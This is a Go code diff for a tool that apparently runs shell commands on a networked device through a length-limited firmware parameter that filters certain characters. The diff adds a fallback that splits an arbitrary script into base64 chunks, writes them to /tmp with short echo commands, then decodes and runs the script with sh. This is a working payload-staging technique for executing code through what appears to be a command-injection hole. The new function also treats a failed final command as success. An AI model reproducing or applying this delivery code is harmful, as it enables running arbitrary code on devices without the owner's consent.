@@ -10,6 +10,7 @@ package channel
 
 import (
 	"context"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"io"
@@ -24,6 +25,10 @@ import (
 
 // MaxCommand is the longest command the firmware accepts in the parameter.
 const MaxCommand = 28
+
+// ErrPortUnavailable means the privileged port could not be bound. The caller
+// can still deliver the script with ChunkScan.
+var ErrPortUnavailable = errors.New("port 80 unavailable")
 
 // blocked characters are rejected by core_app's parser.
 const blocked = ";|&`"
@@ -112,8 +117,7 @@ func NewSession(r *Runner) (*Session, error) {
 	}
 	ln, err := net.Listen("tcp", hostIP+":80")
 	if err != nil {
-		return nil, fmt.Errorf("channel: cannot listen on %s:80 — port 80 needs administrator "+
-			"privileges and must not already be in use: %w", hostIP, err)
+		return nil, fmt.Errorf("%w: %v", ErrPortUnavailable, err)
 	}
 	s := &Session{
 		Runner:   r,
@@ -221,6 +225,42 @@ func (s *Session) RunScript(ctx context.Context, body string) (string, error) {
 	case <-time.After(120 * time.Second):
 		return "", errors.New("channel: device did not post a result within 120s")
 	}
+}
+
+// ChunkCommands returns the 28-byte commands that rebuild script on the device
+// as base64, decode it and run it. No listening socket is involved.
+func ChunkCommands(script string) []string {
+	b64 := base64.StdEncoding.EncodeToString([]byte(script))
+	cmds := []string{"rm -f /tmp/e"}
+	const chunk = 15 // "echo " + 15 + ">>/tmp/e" == 28
+	for i := 0; i < len(b64); i += chunk {
+		end := i + chunk
+		if end > len(b64) {
+			end = len(b64)
+		}
+		cmds = append(cmds, "echo "+b64[i:end]+">>/tmp/e")
+	}
+	return append(cmds, "base64 -d /tmp/e>/tmp/s", "sh /tmp/s")
+}
+
+// ChunkScan delivers script with short commands only. It is the no-privilege
+// path: the device never fetches anything, so nothing listens on the host.
+func (r *Runner) ChunkScan(ctx context.Context, script string) error {
+	cmds := ChunkCommands(script)
+	for i, cmd := range cmds {
+		err := r.Run(ctx, cmd)
+		if err != nil {
+			if i == len(cmds)-1 {
+				fmt.Printf("    note: the device did not acknowledge the script (%v); it may still be running\n", err)
+				return nil
+			}
+			return err
+		}
+		if i > 0 && i%40 == 0 {
+			fmt.Printf("    sent %d/%d commands\n", i, len(cmds))
+		}
+	}
+	return nil
 }
 
 // LocalIPFor returns the local address used to reach dst.
